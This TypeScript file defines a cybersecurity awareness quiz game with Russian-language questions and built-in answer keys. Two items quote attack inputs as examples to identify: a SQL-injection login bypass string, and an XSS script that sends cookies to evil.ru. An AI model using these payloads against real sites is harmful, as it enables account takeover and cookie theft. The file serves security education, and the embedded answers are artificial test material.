export type TaskDifficulty = 1 | 2 | 3 | 4 | 5;

export interface RoomTask {
  id: string;
  type: 'text' | 'choice' | 'sequence' | 'binary' | 'code';
  difficulty: TaskDifficulty;
  category: 'network' | 'crypto' | 'social' | 'forensics' | 'malware' | 'web';
  title: string;
  description: string;
  hint?: string;
  options?: Array<{ text: string; isCorrect: boolean; explanation: string; }>;
  correctAnswer?: string;
  acceptVariants?: string[];
  caseSensitive?: boolean;
  sequence?: string[];
  timeLimit?: number;
  correctChoice?: 'yes' | 'no';
  xpReward: number;
  penaltyOnFail?: number;
}

export interface RoomDifficultyConfig {
  roomIndex: number;
  difficulty: TaskDifficulty;
  hazards: {
    enemies: number;
    turrets: number;
    lasers: number;
    cameras: number;
  };
  hasTimer: boolean;
  timerSeconds?: number;
  rewardMultiplier: number;
}

export const ROOM_PROGRESSION: RoomDifficultyConfig[] = [
  { roomIndex: 0, difficulty: 1, hazards: { enemies: 0, turrets: 0, lasers: 0, cameras: 0 }, hasTimer: false, rewardMultiplier: 1.0 },
  { roomIndex: 1, difficulty: 1, hazards: { enemies: 0, turrets: 0, lasers: 1, cameras: 1 }, hasTimer: false, rewardMultiplier: 1.1 },
  { roomIndex: 2, difficulty: 2, hazards: { enemies: 0, turrets: 0, lasers: 2, cameras: 1 }, hasTimer: true, timerSeconds: 120, rewardMultiplier: 1.3 },
  { roomIndex: 3, difficulty: 2, hazards: { enemies: 1, turrets: 0, lasers: 2, cameras: 2 }, hasTimer: true, timerSeconds: 100, rewardMultiplier: 1.5 },
  { roomIndex: 4, difficulty: 3, hazards: { enemies: 1, turrets: 1, lasers: 2, cameras: 2 }, hasTimer: true, timerSeconds: 90, rewardMultiplier: 1.7 },
  { roomIndex: 5, difficulty: 3, hazards: { enemies: 2, turrets: 1, lasers: 3, cameras: 2 }, hasTimer: true, timerSeconds: 80, rewardMultiplier: 2.0 },
  { roomIndex: 6, difficulty: 4, hazards: { enemies: 2, turrets: 2, lasers: 3, cameras: 3 }, hasTimer: true, timerSeconds: 75, rewardMultiplier: 2.3 },
  { roomIndex: 7, difficulty: 4, hazards: { enemies: 3, turrets: 2, lasers: 4, cameras: 3 }, hasTimer: true, timerSeconds: 70, rewardMultiplier: 2.6 },
  { roomIndex: 8, difficulty: 5, hazards: { enemies: 3, turrets: 3, lasers: 4, cameras: 4 }, hasTimer: true, timerSeconds: 60, rewardMultiplier: 3.0 },
  { roomIndex: 9, difficulty: 5, hazards: { enemies: 4, turrets: 3, lasers: 5, cameras: 4 }, hasTimer: true, timerSeconds: 50, rewardMultiplier: 4.0 }
];

export const RUSSIAN_TASKS: RoomTask[] = [
  {
    id: 't1_password', type: 'choice', difficulty: 1, category: 'social',
    title: 'Безопасный пароль', description: 'Какой из этих паролей самый безопасный?',
    options: [
      { text: '123456', isCorrect: false, explanation: 'Самый популярный — взламывается за секунду' },
      { text: 'password', isCorrect: false, explanation: 'Это слово в первой строке любого словаря атаки' },
      { text: 'Tr#9$kP2!mZ7nQ', isCorrect: true, explanation: 'Длинный пароль с символами разных регистров — отличный выбор!' },
      { text: 'qwerty2024', isCorrect: false, explanation: 'Содержит шаблон клавиатуры и год — легко угадывается' }
    ],
    xpReward: 50, penaltyOnFail: 5
  },
  {
    id: 't1_phishing_basic', type: 'binary', difficulty: 1, category: 'social',
    title: 'Подозрительное письмо', description: 'Получено письмо: "Срочно! Ваш аккаунт заблокирован. Перейдите по ссылке https://gооgle-secure.ru и введите пароль". Это фишинг?',
    timeLimit: 15, correctChoice: 'yes', hint: 'Обрати внимание на букву "о" в адресе',
    xpReward: 60, penaltyOnFail: 10
  },
  {
    id: 't1_https', type: 'choice', difficulty: 1, category: 'web',
    title: 'Что значит HTTPS?', description: 'Вы видите в браузере https:// перед адресом сайта. Что это означает?',
    options: [
      { text: 'Сайт быстрее загружается', isCorrect: false, explanation: 'Скорость не зависит от протокола' },
      { text: 'Соединение зашифровано', isCorrect: true, explanation: 'Верно! S = Secure. Данные защищены от перехвата' },
      { text: 'Сайт принадлежит государству', isCorrect: false, explanation: 'Это не имеет отношения к владельцу сайта' },
      { text: 'На сайте нет рекламы', isCorrect: false, explanation: 'HTTPS никак не связан с рекламой' }
    ],
    xpReward: 50, penaltyOnFail: 5
  },
  {
    id: 't2_2fa', type: 'text', difficulty: 2, category: 'social',
    title: 'Двухфакторная защита', description: 'Как называется метод защиты, при котором кроме пароля нужно ввести код из SMS или приложения?',
    correctAnswer: '2fa', acceptVariants: ['двухфакторная аутентификация', 'two-factor authentication', '2фа', 'двухфакторка'],
    caseSensitive: false, hint: 'Аббревиатура из цифры и двух букв',
    xpReward: 80, penaltyOnFail: 10
  },
  {
    id: 't2_sql_basic', type: 'choice', difficulty: 2, category: 'web',
    title: 'Странный ввод', description: 'В форме входа пользователь ввёл: admin\' OR \'1\'=\'1. Что это?',
    options: [
      { text: 'Просто опечатка', isCorrect: false, explanation: 'Слишком сложная "опечатка"' },
      { text: 'SQL-инъекция', isCorrect: true, explanation: 'Верно! Классическая атака для обхода авторизации' },
      { text: 'XSS-атака', isCorrect: false, explanation: 'XSS использует JavaScript-теги, не SQL-синтаксис' },
      { text: 'DDoS-атака', isCorrect: false, explanation: 'DDoS — это перегрузка сервера запросами' }
    ],
    hint: 'Кавычка и OR как в запросе к базе данных',
    xpReward: 100, penaltyOnFail: 15
  },
  {
    id: 't2_vpn', type: 'binary', difficulty: 2, category: 'network',
    title: 'Публичный Wi-Fi', description: 'Вы подключились к бесплатному Wi-Fi в кафе. Безопасно ли вводить пароль от банка без VPN?',
    timeLimit: 12, correctChoice: 'no', hint: 'В открытой сети любой может перехватить трафик',
    xpReward: 90, penaltyOnFail: 15
  },
  {
    id: 't3_hash_algorithm', type: 'text', difficulty: 3, category: 'crypto',
    title: 'Замена устаревшего', description: 'Алгоритм MD5 признан небезопасным для хеширования паролей. Какой современный алгоритм рекомендуется использовать вместо него? (введите название)',
    correctAnswer: 'bcrypt', acceptVariants: ['Bcrypt', 'BCrypt', 'argon2', 'scrypt'],
    caseSensitive: false, hint: 'Начинается на букву "b" и связан с шифром "Blowfish"',
    xpReward: 130, penaltyOnFail: 20
  },
  {
    id: 't3_ransomware', type: 'sequence', difficulty: 3, category: 'malware',
    title: 'Атака шифровальщика', description: 'Сервер атакован программой-вымогателем. Расположите действия в правильном порядке:',
    sequence: [
      '1. Отключить сервер от сети',
      '2. Уведомить службу безопасности и руководство',
      '3. Сделать резервный образ диска для расследования',
      '4. Восстановить данные из резервных копий',
      '5. Установить причину заражения и закрыть уязвимость'
    ],
    hint: 'Сначала остановить распространение, потом восстанавливать',
    xpReward: 150, penaltyOnFail: 25
  },
  {
    id: 't3_xss', type: 'choice', difficulty: 3, category: 'web',
    title: 'Опасный комментарий', description: 'На форуме пользователь оставил комментарий: <script>fetch("http://evil.ru/steal?c="+document.cookie)</script>. Что произойдёт?',
    options: [
      { text: 'Ничего, это просто текст', isCorrect: false, explanation: 'Если сайт не фильтрует ввод — скрипт выполнится у каждого посетителя' },
      { text: 'Кража cookie всех, кто откроет страницу', isCorrect: true, explanation: 'Это XSS-атака! Скрипт отправит cookie на сервер атакующего' },
      { text: 'Сервер перезагрузится', isCorrect: false, explanation: 'XSS не влияет на сервер напрямую' },
      { text: 'Удаление базы данных', isCorrect: false, explanation: 'Это ближе к SQL-инъекции' }
    ],
    xpReward: 140, penaltyOnFail: 20
  },
  {
    id: 't4_port_scan', type: 'text', difficulty: 4, category: 'network',
    title: 'Команда сканирования', description: 'Какой инструмент чаще всего используют для сканирования открытых портов на сервере? (введите название)',
    correctAnswer: 'nmap', acceptVariants: ['Nmap', 'NMAP'],
    caseSensitive: false, hint: 'Network Mapper, всего 4 буквы',
    xpReward: 180, penaltyOnFail: 30
  },
  {
    id: 't4_apt', type: 'choice', difficulty: 4, category: 'malware',
    title: 'Долгосрочная атака', description: 'Что такое APT (Advanced Persistent Threat)?',
    options: [
      { text: 'Антивирусная программа', isCorrect: false, explanation: 'Это атака, а не защита' },
      { text: 'Менеджер пакетов в Linux', isCorrect: false, explanation: 'apt — это менеджер, но не угроза' },
      { text: 'Целевая длительная атака на конкретную организацию', isCorrect: true, explanation: 'Верно! APT — спланированная многомесячная атака с конкретной целью' },
      { text: 'Тип шифровального алгоритма', isCorrect: false, explanation: 'APT не связан с криптографией' }
    ],
    hint: 'Persistent = постоянная, целенаправленная',
    xpReward: 200, penaltyOnFail: 35
  },
  {
    id: 't4_zero_day', type: 'binary', difficulty: 4, category: 'malware',
    title: 'Критическое решение', description: 'Обнаружена zero-day уязвимость в production-сервере. Патч от производителя ещё не выпущен. Отключить сервис на время расследования?',
    timeLimit: 8, correctChoice: 'yes', hint: 'Лучше короткий простой, чем масштабная утечка',
    xpReward: 220, penaltyOnFail: 50
  },
  {
    id: 't5_kerberos', type: 'choice', difficulty: 5, category: 'crypto',
    title: 'Атака на тикеты', description: 'Атакующий применил технику "Kerberoasting". Что он пытается сделать?',
    options: [
      { text: 'Расшифровать сервисный тикет Kerberos для получения пароля сервисной учётки', isCorrect: true, explanation: 'Верно! Извлечение TGS-тикетов и брутфорс пароля offline' },
      { text: 'Запустить DDoS на контроллер домена', isCorrect: false, explanation: 'Это другая категория атак' },
      { text: 'Взломать BIOS', isCorrect: false, explanation: 'Kerberos — это сетевая аутентификация, не BIOS' },
      { text: 'Получить root-доступ через SUID', isCorrect: false, explanation: 'SUID — это Linux, а Kerberos чаще атакуют в AD' }
    ],
    hint: 'Связано с Active Directory и сервисными учётными записями',
    xpReward: 280, penaltyOnFail: 60
  },
  {
    id: 't5_incident_response', type: 'sequence', difficulty: 5, category: 'forensics',
    title: 'Полный цикл реагирования', description: 'Произошёл крупный инцидент. Расположите фазы NIST Incident Response в правильном порядке:',
    sequence: [
      '1. Подготовка (Preparation)',
      '2. Обнаружение и анализ (Detection & Analysis)',
      '3. Сдерживание (Containment)',
      '4. Устранение (Eradication)',
      '5. Восстановление (Recovery)',
      '6. Извлечение уроков (Lessons Learned)'
    ],
    hint: 'Стандарт NIST SP 800-61',
    xpReward: 350, penaltyOnFail: 80
  },
  {
    id: 't5_supply_chain', type: 'text', difficulty: 5, category: 'malware',
    title: 'Атака на цепочку', description: 'В декабре 2020 года произошла одна из крупнейших supply chain атак в истории через обновление ПО. Введите название взломанного продукта (одно слово):',
    correctAnswer: 'solarwinds', acceptVariants: ['SolarWinds', 'solar winds', 'Solar Winds'],
    caseSensitive: false, hint: 'Платформа сетевого мониторинга, название из двух слов: солнце + ветер',
    xpReward: 320, penaltyOnFail: 70
  }
];

export function getTaskForRoom(roomIndex: number): RoomTask {
  const config = ROOM_PROGRESSION[roomIndex];
  if (!config) return RUSSIAN_TASKS[0];
  const candidates = RUSSIAN_TASKS.filter(t => t.difficulty === config.difficulty);
  return candidates[roomIndex % candidates.length];
}
